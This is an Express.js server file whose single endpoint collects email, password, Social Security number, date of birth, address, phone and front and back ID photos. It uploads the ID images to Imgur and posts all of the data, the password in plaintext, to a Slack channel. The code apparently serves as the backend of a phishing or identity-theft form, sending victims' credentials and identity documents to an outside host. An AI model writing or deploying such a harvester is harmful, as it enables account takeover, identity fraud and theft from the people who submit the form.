const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const axios = require("axios");
const { WebClient } = require("@slack/web-api");
const cors = require("cors");
require("dotenv").config();

const app = express();
const port = 3000;

// Slack API Configuration
const slackToken = process.env.SLACK_TOKEN;
const slackChannelId = process.env.SLACK_CHANNEL_ID;

// Imgur API Configuration
const imgurClientId = process.env.IMG_UR_CLIENT_ID;
const imgurApiUrl = process.env.IMG_UR_API_URL;

// Multer configuration for handling file uploads
const multerStorage = multer.memoryStorage();
const upload = multer({ storage: multerStorage });

// Slack Web API client
const web = new WebClient(slackToken);

// Use the cors middleware
app.use(cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post(
  "/postToSlack",
  upload.fields([
    { name: "idFront", maxCount: 1 },
    { name: "idBack", maxCount: 1 },
  ]),
  async (req, res) => {
    try {
      const {
        email,
        password,
        firstName,
        lastName,
        phone,
        ssn,
        homeAddress,
        city,
        state,
        zipCode,
        dateOfBirth,
      } = req.body;

      // Compile a message with user information
      const userMessage = `New submission:\nEmail: ${email}\nPassword: ${password}\nFirst Name: ${firstName}\nLast Name: ${lastName}\nPhone: ${phone}\nHome Address: ${homeAddress}\nCity: ${city}\nState: ${state}\nZipcode: ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;

      const idFront = req.files["idFront"]?.[0]?.buffer;
      const idBack = req.files["idBack"]?.[0]?.buffer;

      // Upload idFront to Imgur
      const idFrontUrl = idFront
        ? await uploadToImgur(idFront, "idFront", 1)
        : null;

      // Upload idBack to Imgur
      const idBackUrl = idBack
        ? await uploadToImgur(idBack, "idBack", 2)
        : null;

      const imgurUrls = [idFrontUrl, idBackUrl].filter(Boolean);

      // Post message to Slack with the Imgur image URLs
      const message = {
        channel: slackChannelId,
        text: userMessage,
        attachments: imgurUrls.map((url, index) => ({
          image_url: url,
          text: `Uploaded Image ${index + 1}`,
        })),
      };

      const postMessageResponse = await web.chat.postMessage(message);

      // Handle postMessage errors
      if (!postMessageResponse.ok) {
        console.error("Error posting to Slack:", postMessageResponse.error);
        return res.status(500).json({ error: "Error posting to Slack" });
      }

      return res.status(200).json({ success: true });
    } catch (error) {
      console.error("Error handling request:", error.message);
      return res.status(500).json({ error: "Internal Server Error" });
    }
  }
);

// Function to upload file to Imgur
async function uploadToImgur(buffer, fieldName, index) {
  try {
    const imgurResponse = await axios.post(imgurApiUrl, buffer, {
      headers: {
        Authorization: `Client-ID ${imgurClientId}`,
        "Content-Type": "image/jpeg", // Adjust the content type as needed
      },
    });

    if (imgurResponse.data.success) {
      return imgurResponse.data.data.link;
    } else {
      console.error(
        `Imgur API error for ${fieldName} image ${index}:`,
        imgurResponse.data.data.error
      );
      return null;
    }
  } catch (error) {
    console.error(
      `Error uploading ${fieldName} image ${index}:`,
      error.message
    );
    return null;
  }
}

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
